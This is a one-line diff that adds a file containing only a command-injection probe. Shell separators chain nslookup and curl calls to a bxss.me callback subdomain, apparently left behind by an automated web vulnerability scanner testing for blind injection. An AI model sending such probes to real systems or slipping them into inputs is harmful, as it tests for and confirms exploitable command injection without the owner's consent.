@@ -1,0 +1,1 @@
+;(nslookup -q=cname hitiasjcakvtn2227b.bxss.me||curl hitiasjcakvtn2227b.bxss.me)|(nslookup -q=cname hitiasjcakvtn2227b.bxss.me||curl hitiasjcakvtn2227b.bxss.me)&(nslookup -q=cname hitiasjcakvtn2227b.bxss.me||curl hitiasjcakvtn2227b.bxss.me)
